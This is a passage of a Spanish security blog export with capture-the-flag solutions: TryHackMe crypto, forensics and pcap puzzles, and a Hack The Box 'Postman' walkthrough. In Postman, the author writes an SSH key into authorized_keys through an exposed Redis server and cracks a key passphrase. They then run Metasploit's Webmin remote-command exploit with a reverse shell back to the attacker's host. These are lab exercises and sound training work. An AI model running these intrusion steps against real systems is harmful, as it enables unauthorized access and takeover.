Reto:\nVW10NFFsSXpjM3BqYlZKbVpFZHNkRnBZVG1aWlZqbHFZVWRHZVdKWU1EMD0= Base64 X3\n1  https://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=VlcxME5GRnNTWHBqTTNCcVlsWktiVnBGWkhOa1JuQlpWRzFhV2xacWJIRlpWV1JIWlZkS1dVMUVNRDA9   c.03 Reto:\nSYNT{fgnoorq_va_gur_onpx} ROT13\nhttps://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)\u0026amp;input=U1lOVHtmZ25vb3JxX3ZhX2d1cl9vbnB4fQ c.04 Reto:\nF5yd29CuXST7e5aMKaX4bnkV8xF8dKSMB7E14yWUU Base58\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)\u0026amp;input=RjV5ZDI5Q3VYU1Q3ZTVhTUthWDRibmtWOHhGOGRLU01CN0UxNHlXVVU c.05 Reto:\n\\H\u0011WPG^DCXET\u0011EHAT\u0011^W\u0011T_RCHAEX^_\u0011XB\u0011I^CX_V;XE\u0016B\u0011EYT\u0011STBE;\u0012B^\u0011BTRDCT;;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL 1- XOR BruteForce (Key: 31)\n2- XOR\nhttps://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,'Standard',false,true,false,''/disabled)XOR(%7B'option':'Hex','string':'31'%7D,'Standard',false)\u0026amp;input=XEgRV1BHXkRDWEVUEUVIQVQRXlcRVF9SQ0hBRVheXxFYQhFJXkNYX1Y7WEUWQhFFWVQRU1RCRTsSQl4RQlRSRENUOzt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTA c.06 Reto:\nMlw Obkwgxvw vbtzxk mk t filahh gy xrukrtlbgk seilsuxxav mipm uc mlbry t lijbxw gy brlxkagoxr Utxwsk vmhaxvk, utwww hr lax pwmmijl hj s dxcohkh. Am xqhehck t ysjf hj hhecseilsuxxav lytlmmlnmmgg. Ymjlm hwlvvauxh tr Zmgotr Ttmxalme Txepslh mf 1553, mai ubilwk bw wtlc lh nrvxkwltgh sgw meieiexgx, tnm ml kxwalmiv tep smmieimw lh uvwtd ml ngxae 1863, mljxx gwgmyjbxw dtmij. Mamk xtvfxw ml mai vxlgjbixahg pw vamxyki agwiuabjxktfdx (Yvwgvl xhk 'xzx brvxvmhaxvsuei ubilwk'). Fefr iigiei ztoi lkbiv mh meieiexgx wgvvqimmgg lgzxfik mael tki wllifmbeder Zazxrwkx gaiaijl. Br 1863, Xkbivkbgz Dtwaldm otl xzx ymjlm xg infdbll s zxrwktp exmlgw hj vxvmhaxvagz Zazxrwkx gaiaijl. Br lax 19xz vxrlnkc lax wuaxqw ptw eblelmkmtnmiv mh Fdtbww wx Zazxrwkx (1523–1596), efw ls svjyakxh aml tjxlifm geex. Rsmk ypsz bw txeso: YEEY{vasuheelx_xgdtbvw} Vigenere-cipher\nc.07 Reto:\n-----BEGIN RSA PRIVATE KEY----- MIIBOQIBAAJBALWyVLY0Yum5/589v9ECnrHDzDu1AyDP38Ajx6tcul9G2cFUFUMY Iqf9Wm8BFxNxErdOWmhlJaw+q8rbaAyyRvUCAwEAAQJAWEYrodoRtDwJVPRLHOCI +RSHRPrMakSUEGVRvI9wfJi654A0HYLyk8JZnf+CbeueI7KnN/2w4MPIkxK9Mjfk gQIhAP878FR1Yo1X508REZ1YNVDKc6pl33Fm32LVSbz5s/RzAiEAtj3nQwJEgVG4 Bv2CIBZ1CRIGmILeZY3Cx54hGnB55PcCIGy/CgfCN+pHALvUZu/mTFkO2TdJzmkP zq/adl94+K53AiAZ5PHXM5tIRLRBSgQTSx2WDFmjkfTHuTzT4EQT3ad0QQIgUPy3 p9QrcqBWnnHkTM+MjIjpRzQ2TMLx1e6dOxgYDl4= -----END RSA PRIVATE KEY----- openssl enc -in c.07.txt -out binarytext -d -a \u0026amp;\u0026amp; openssl rsautl -decrypt -in binarytext -out flag07.txt -inkey c.07.key \u0026amp;\u0026amp; cat flag07.txt\nc.08 Reto:\nhint: bacon loloooolooololoololoooollollololloooolooloolooolllooloooololololoooooooollooloooloooloooolooooooooloollololloooooooollooooollooloooollooolloloooloooooollooooollloloooloooooolooolll Bacon Cipher\nc.09 Reto:\nWOPM PM ZG ZDJOZEYWPR MXEMWPWXWPHG RPJOYL VOYLY YZRO DYWWYL PM LYJDZRYT VPWO ZGHWOYL. WOY ZDJOZEYW PM ZERTYUIOPQSDFGHJKLMWXCVBNA. NHXL UDZI PM UDZI{YZMN_ZM_ZER_123} 1- Monoalphabetic Substitution\n2- CyberChef - Monoalphabetic Substitution\nhttps://gchq.github.io/CyberChef/#recipe=Substitute('PLAYFM','FLAGYB')\u0026amp;input=VEhJUyBJUyBBTiBBTERIQU1FVElDIFNVTVNUSVRVVElPTiBDSURIRVIgV0hFUkUgRUFDSCBMRVRURVIgSVMgUkVETEFDRUcgV0lUSCBBTk9USEVSLiBUSEUgQUxESEFNRVQgSVMgQU1DR0VQWUhJVlpMS05PREpSU1RVQldRRlguIEZPVVIgUExBWSBJUyBQTEFZe0VBU0ZfQVNfQU1DXzEyM30 FLAG{easy_as_abc_123}\nc.10 Reto:\n333 555 2 4 7 777 33 2 66 3 777 666 444 3 2 66 3 444 666 7777 Multitap abc Cipher\nForensics f.01 1 2 3  sckull@uplifted:~/tmp/forensics$ cat f.01|grep FLAG FLAG{here_i_am} sckull@uplifted:~/tmp/forensics$   f.02.wav Morse - Decoder Audio\n1  FLAG{MORSE **** ***}   f.03.jpg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  sckull@uplifted:~/tmp/forensics$ exiftool f.03.jpg ExifTool Version Number : 10.80 File Name : f.03.jpg Directory : . File Size : 103 kB File Modification Date/Time : 2019:10:26 13:57:46-06:00 File Access Date/Time : 2019:10:26 13:57:46-06:00 File Inode Change Date/Time : 2020:03:10 18:52:40-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Exif Byte Order : Little-endian (Intel, II) X Resolution : 300 Y Resolution : 300 Resolution Unit : inches Software : GIMP 2.10.8 Modify Date : 2019:10:20 20:43:54 GPS Latitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Longitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Altitude : 0 m Compression : JPEG (old-style) Photometric Interpretation : YCbCr Samples Per Pixel : 3 Thumbnail Offset : 370 Thumbnail Length : 10424 XMP Toolkit : XMP Core 4.4.0-Exiv2 Digital Source Type : http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture Document ID : gimp:docid:gimp:718367af-6e16-4bd5-859e-7d934e66fc4e Instance ID : xmp.iid:4816adee-26e4-489c-9d9f-125d04d23c3b Original Document ID : xmp.did:8ea562a1-efa5-4766-b216-6fd07e106c76 Model Release Status : None Api : 2.0 Platform : Linux Time Stamp : 1571600638600225 Version : 2.10.8 Format : image/jpeg Creator Tool : GIMP 2.10 Location Created : Location Shown : Artwork Or Object : Registry ID : History Action : saved, saved History Changed : /metadata, / History Instance ID : xmp.iid:aad9dc17-4a47-49b9-a57f-540623e0091d, xmp.iid:d8a72d8c-5fd0-43b7-a097-16b682f31893 History Software Agent : Gimp 2.10 (Linux), Gimp 2.10 (Linux) History When : +01:00, +01:00 Image Supplier : Image Creator : Copyright Owner : Licensor : Creator : type=\u0026#34;Seq\u0026#34; FLAG{**********} Image Width : 800 Image Height : 600 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 800x600 Megapixels : 0.480 Thumbnail Image : (Binary data 10424 bytes, use -b option to extract) GPS Position : 0 deg 0\u0026#39; 0.00\u0026#34;, 0 deg 0\u0026#39; 0.00\u0026#34; sckull@uplifted:~/tmp/forensics$  f.04 1 2 3 4 5  sckull@uplifted:~/tmp/forensics$ file _f.04 _f.04: ASCII text sckull@uplifted:~/tmp/forensics$ cat _f.04 FLAG{*******_****_engaged} sckull@uplifted:~/tmp/forensics$   f.05.png 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  sckull@uplifted:~/tmp/forensics$ binwalk f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ binwalk -e f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ cd _f.05.png.extracted/ sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ ls 1FF29D.zip 63\t63.zlib flag.txt sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ cat flag.txt flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$   f.06.png 1 2 3 4 5 6 7 8 9 10 11 12 13  sckull@uplifted:~/tmp/forensics$ xxd f.06.png |head 00000000: 8950 4e58 0d0a 1a0a 0000 000d 4948 4452 .PNX........IHDR 00000010: 0000 0640 0000 0429 0806 0000 0099 68c1 ...@...)......h. 00000020: 1c00 002d c07a 5458 7452 6177 2070 726f ...-.zTXtRaw pro 00000030: 6669 6c65 2074 7970 6520 6578 6966 0000 file type exif.. 00000040: 78da ad9c 6992 2d37 8ea5 ff73 15b9 04ce x...i.-7...s.... 00000050: c372 4090 34eb 1dd4 f2eb 3b1e 21a9 a4ac .r@.4.....;.!... 00000060: 2ab3 6e6b 3d65 46e8 be3b b813 c019 40f0 *.nk=eF..;....@. 00000070: 86fb 1fff e785 7ffd eb5f 29e6 1443 6d63 ........._)..Cmc 00000080: f6d5 7be4 9fba eaca c62f 33fe fcf3 f333 ..{....../3....3 00000090: c5fa fdff f70f bff6 df47 fff6 78c8 ebfb .........G..x... sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ xxd -p f.06.png \u0026gt; hex_png06   BAD HEADER FILE MAGIC NUMBERS\nList of File Signatures\n1 2  89 50 4E 47 0D 0A 1A 0A FLAG{n0_m0r3_c0rrupt10n}   f.07.zip 1 2 3 4 5 6 7 8 9 10  sckull@uplifted:~/tmp/forensics$ fcrackzip -D -u -p /home/sckull/tools/rockyou.txt f.07.zip PASSWORD FOUND!!!!: pw == password1 sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ unzip f.07.zip Archive: f.07.zip [f.07.zip] flag.txt password: inflating: flag.txt sckull@uplifted:~/tmp/forensics$ cat flag.txt FLAG{zippy_zip_zip_zip} sckull@uplifted:~/tmp/forensics$   f.08 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  sckull@uplifted:~/tmp/forensics$ file f.08 f.08: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=ea2b43595682667af187b0ac8db31207e9bf845f, for GNU/Linux 3.2.0, not stripped sckull@uplifted:~/tmp/forensics$ chmod +x f.08 sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: hello Sorry the flag is incorrect sckull@uplifted:~/tmp/forensics$ gdb -q ./f.08 Reading symbols from ./f.08...(no debugging symbols found)...done. gdb-peda$ disas main [... snip ...] 0x00000000000011d4 \u0026lt;+43\u0026gt;:\tmov BYTE PTR [rbp-0x73],0x46 0x00000000000011d8 \u0026lt;+47\u0026gt;:\tmov BYTE PTR [rbp-0x72],0x4c 0x00000000000011dc \u0026lt;+51\u0026gt;:\tmov BYTE PTR [rbp-0x71],0x41 0x00000000000011e0 \u0026lt;+55\u0026gt;:\tmov BYTE PTR [rbp-0x70],0x47 0x00000000000011e4 \u0026lt;+59\u0026gt;:\tmov BYTE PTR [rbp-0x6f],0x7b 0x00000000000011e8 \u0026lt;+63\u0026gt;:\tmov BYTE PTR [rbp-0x6e],0x69 0x00000000000011ec \u0026lt;+67\u0026gt;:\tmov BYTE PTR [rbp-0x6d],0x6e 0x00000000000011f0 \u0026lt;+71\u0026gt;:\tmov BYTE PTR [rbp-0x6c],0x63 0x00000000000011f4 \u0026lt;+75\u0026gt;:\tmov BYTE PTR [rbp-0x6b],0x6f 0x00000000000011f8 \u0026lt;+79\u0026gt;:\tmov BYTE PTR [rbp-0x6a],0x72 0x00000000000011fc \u0026lt;+83\u0026gt;:\tmov BYTE PTR [rbp-0x69],0x72 0x0000000000001200 \u0026lt;+87\u0026gt;:\tmov BYTE PTR [rbp-0x68],0x65 0x0000000000001204 \u0026lt;+91\u0026gt;:\tmov BYTE PTR [rbp-0x67],0x63 0x0000000000001208 \u0026lt;+95\u0026gt;:\tmov BYTE PTR [rbp-0x66],0x74 0x000000000000120c \u0026lt;+99\u0026gt;:\tmov BYTE PTR [rbp-0x65],0x7d [... snip ...]   HEX\n1  46 4c 41 47 7b 69 6e 63 6f 72 72 65 63 74 7d   FLAG\n1  FLAG{incorrect}   Con la frase correcta:\n1 2 3 4 5 6  sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: FLAG{incorrect} Well done, you got the flag correct!!! sckull@uplifted:~/tmp/forensics$   f.09 1 2 3 4 5 6 7 8 9  0f4d0db3668dd58cabb9eb409657eaa8 { d015cc465bdb4e51987df7fb870472d3fb9a3505 _ _ b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 _ d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa }   f.10 Brainfuck Language\nNetworking n.01.pcap Filtro: HTTP GET\nFLAG{n0w_y0ur_g3tt1ng_1t}\nn.02.pcap Filtro: HTTP POST\nFLAG{1_am_th3_p0stm4n}\nn.03.pcap USER AGENT\nFLAG{s3cr3t_ag3nt}\nn.04.pcap OBJECTS HTTP\nFLAG{h3r3_1_am}\nn.05.pcap SMB\nSMB OBJECT\n1 2 3 4 5  sckull@uplifted:~/tmp/networking$ tar -xvf smb_object05.tar flag.txt sckull@uplifted:~/tmp/networking$ cat flag.txt FLAG{smb_smb_smb_smb_smb_smb} sckull@uplifted:~/tmp/networking$   n.06.pcap FTP\nFLAG{1n3s3cur3_\nTELNET\npr0t0c0ls}\nFLAG{1n3s3cur3_pr0t0c0ls}\nn.07.pcap DNS\n1  46 4c 41 47 7b 64 6e 73 5f 33 78 66 31 6c 74 72 34 74 30 72 7d   https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')\u0026amp;input=NDYgNGMgNDEgNDcgN2IgNjQgNmUgNzMgNWYgMzMgNzggNjYgMzEgNmMgNzQgNzIgMzQgNzQgMzAgNzIgN2Q FLAG{dns_3xf1ltr4t0r}\nn.08.pcap tcp and data\nFLAG{this is a hidden flag}\nn.09 7z File\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  sckull@uplifted:~/tmp/networking$ file n.09 n.09: 7-zip archive data, version 0.3 sckull@uplifted:~/tmp/networking$ xxd n.09 | head 00000000: 377a bcaf 271c 0003 46c0 dcbf d40b 0000 7z..\u0026#39;...F....... 00000010: 0000 0000 2300 0000 0000 0000 cf09 fa64 ....#..........d 00000020: 0068 33be 1c86 3077 60f4 a484 2585 fa1c .h3...0w`...%... 00000030: 7627 82f2 9186 dc88 ca27 bae3 fb13 c5ff v\u0026#39;.......\u0026#39;...... 00000040: 0e24 c288 d1b1 0114 695f 90fd b8ca a6d3 .$......i_...... 00000050: 2f38 db8c 915e 7e32 f588 4d5c 3f35 4a84 /8...^~2..M\\?5J. 00000060: 242d b5f0 8c96 a4e0 ce62 7105 5389 18f1 $-.......bq.S... 00000070: e946 8af0 1d2f a762 e91a 934b 32a6 7eb8 .F.../.b...K2.~. 00000080: 8322 16d1 2abc 32be 2107 1dae 03ac 6edf .\u0026#34;..*.2.!.....n. 00000090: e042 8551 7d12 e93f 57e4 fa2b 4f3d a993 .B.Q}..?W..+O=.. sckull@uplifted:~/tmp/networking$mv n.09 n.09.7z sckull@uplifted:~/tmp/networking$7z e n.09.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz (806EA),ASM,AES-NI) Scanning the drive for archives: 1 file, 3095 bytes (4 KiB) Extracting archive: n.09.7z -- Path = n.09.7z Type = 7z Physical Size = 3095 Headers Size = 198 Method = LZMA:23 Solid = + Blocks = 1 Everything is Ok Files: 2 Size: 26112 Compressed: 3095 sckull@uplifted:~/tmp/networking$sckull@uplifted:~/tmp/networking$strings *.msg| grep FL FLAG\\{sn41L_m41L\\} FLAG{sn41L_m41L}\u0026lt;br\u0026gt; sckull@uplifted:~/tmp/networking$  n.10.pcap SSL Certificate\nSSL Wireshark: Edit \u0026gt; Preferences \u0026gt; Protocols \u0026gt; SSL \u0026gt; (Pre)-Master-Secret log filename \u0026gt; Select n.10.ssl.log\nFLAG{y0u_ar3_c3rt1f13d_n0w}\n","description":"","id":39,"section":"posts","tags":["challenge"],"title":"TryHackMe - Stealthcopter CTF Primer1","uri":"https://sckull.github.io/posts/stealthcopter/"},{"content":"Postman es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Postman     OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.160   Maker TheCyberGeek    NMAP Escaneo de puerto tcp/udp, en el cual nos muestra el puerto http (80) y el puerto de ssh (22) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # Nmap 7.80 scan initiated Thu Dec 26 14:42:29 2019 as: nmap -p- --min-rate 1000 -o postman_nmap 10.10.10.160 Warning: 10.10.10.160 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.160 Host is up (0.26s latency). Not shown: 65213 closed ports, 318 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 6379/tcp open redis 10000/tcp open snet-sensor-mgmt # Nmap done at Thu Dec 26 14:45:40 2019 -- 1 IP address (1 host up) scanned in 191.74 seconds # Nmap 7.80 scan initiated Thu Dec 26 14:46:53 2019 as: nmap -sV -sC -p22,80,6379,10000 -o postman_nmap_v 10.10.10.160 Nmap scan report for 10.10.10.160 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA) | 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA) |_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: The Cyber Geek\u0026#39;s Personal Website 6379/tcp open redis Redis key-value store 4.0.9 10000/tcp open http MiniServ 1.910 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Dec 26 14:47:36 2019 -- 1 IP address (1 host up) scanned in 43.58 seconds   HTTP (Puerto 80) En el puerto 80 nos muestra una pagina que al parecer esta en construccion.\nPUERTO 6379 En el puerto 6379 nos muestra un mensaje de error.\nPUERTO 10000 En este puerto nos muestra un mensaje de error en el cual nos dice que probemos en el protocolo https.\nCambiamos a https y nos muestra un panel de Webmin.\nGOBUSTER - Puerto 80 Encontramos algunos directorios y archivos.\n1 2 3 4 5 6 7 8 9  root@aoiri:~/htb/postman# gobuster dir -u http://10.10.10.160/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 15 -q /css (Status: 301) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /upload (Status: 301)   REDIS PUERTO 6379 Como vimos en el reporte de nmap este puerto esta corriendo un servicio de redis 4.0.9. Al intentar conectarnos con el servicio mediante redis-tools podemos obtener informacion del mismo.\nREDIS - Explotacion Utilizando los comandos de redis podemos obtener informacion del directorio donde esta corriendo o esta siendo utilizado por redis, tambien el nombre del archivo (dbfilename).\nVemos que la configuracion del dbfilename es dump.rdb y el directorio esta ubicado en /var/lib/redis, para obtener acceso a la maquina mediante redis vamos a sobrescribir la configuracion, agregando el dbfilename como authorized_keys donde vamos a escribir nuestra clave publica de ssh y dir como /var/lib/redis/.ssh.\nREDIS SSH Generamos nuestra clave publica con ssh-keygen la cual vamos a utilizar para iniciar sesion en el servicio ssh.\nAntes de configurar redis debemos de agregar saltos de linea antes y despues en nuevo archivo agregando nuestra clave publica.\n1  (echo -e \u0026#34;\\n\\n\u0026#34;; cat id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; clave_publica.txt   Utilizamos redis-cli localmente para agregar la configuracion que necesitamos a la maquina, con los comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #Configuracion dir redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh config get dir #Configuracion dbfilename config set dbfilename authorized_keys config get dbfilename SLAVEOF NO ONE save #Escritura de clave publica en nuestra key cat clave_publica.txt | redis-cli -h 10.10.10.160 -x set s-key get s-key   Verificamos que nuestra clave publica se haya escrito en nuestra key (s-key):\nUtilizando nuestra clave privada iniciamos sesion con el usuario redis:\nVemos el historial del usuario redis, encontramos que el usuario edito un archivo de python y un archivo de id_rsa.bak:\nArchivo id_rsa.bak:\nUSER - Matt Utilizando la clave privada con el usuario Matt con ssh nos pregunta por la frase.\nUtilizamos ssh2john para obtener el hash del archivo y junto con john the ripper crackear la frase de la clave privada.\n1 2  python ssh2john.py id_rsa_matt \u0026gt; id_rsa_matt.hash john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_matt.hash   FRASE: computer2008\nObtenemos la frase pero al intentar utilizarla con la clave privada no nos permite iniciars sesion.\nUtilizamos la misma frase como contraseña de Matt y con el comando su, obtuvimos una shell con el usuario Matt y nuestra flag user.txt.\nFlag:\nPRIVILEGE ESCALATION Utilizamos las credenciales de Matt en el puerto 10000 o webmin panel, exitosamente logramos iniciar sesion.\nLa version de webmin menores o iguales a 1.910 tienen una vulnerabilidad (CVE:2019-12840) que permite la ejecucion de comandos, configuramos metasploit con el cve, añadimos las credenciales de Matt y utilizamos SSL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  msf5 \u0026gt; search 2019-12840 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/webmin_packageup_rce 2019-05-16 excellent Yes Webmin Package Updates Remote Command Execution msf5 \u0026gt; use exploit/linux/http/webmin_packageup_rce msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set rhosts 10.10.10.160 rhosts =\u0026gt; 10.10.10.160 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; show options Module options (exploit/linux/http/webmin_packageup_rce): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.160 yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 10000 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Base path for Webmin application USERNAME yes Webmin Username VHOST no HTTP server virtual host Payload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Webmin \u0026lt;= 1.910 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.10.14.67 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set USERNAME Matt USERNAME =\u0026gt; Matt msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set PASSWORD computer2008 PASSWORD =\u0026gt; computer2008 msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; set SSL true SSL =\u0026gt; true msf5 exploit(linux/http/webmin_packageup_rce) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.67:4444 [+] Session cookie: 4c7f4b517283e96d41da23ced104e00a [*] Attempting to execute the payload... [*] Command shell session 1 opened (10.10.14.67:4444 -\u0026gt; 10.10.10.160:42436) at 2019-12-29 22:13:48 -0600 id uid=0(root) gid=0(root) groups=0(root) whoami; pwd root /usr/share/webmin/package-updates/   Obtenemos una sesion con privilegios root y nuestra flag root.txt.\n","description":"","id":40,"section":"posts","tags":["linux"],"title":"Hack The Box - Postman","uri":"https://sckull.github.io/posts/postman/"},{"content":"Willow es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Willow     Info What lies under the Willow Tree?   Puntos 380   Dificultad Media   Maker MuirlandOracle    NMAP Escaneo de puerto tcp, en el cual nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  # Nmap 7.80 scan initiated Fri Feb 28 14:00:08 2020 as: nmap -sV -p- --min-rate=1000 -o nmap_rate willow.thm Nmap scan report for willow.thm Host is up (0.19s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5 (protocol 2.0) 80/tcp open http Apache httpd 2.4.10 ((Debian)) 111/tcp open rpcbind 2-4 (RPC #100000) 2049/tcp open nfs 2-4 (RPC #100003) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 28 14:01:52 2020 -- 1 IP address (1 host up) scanned in 103.49 seconds   GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 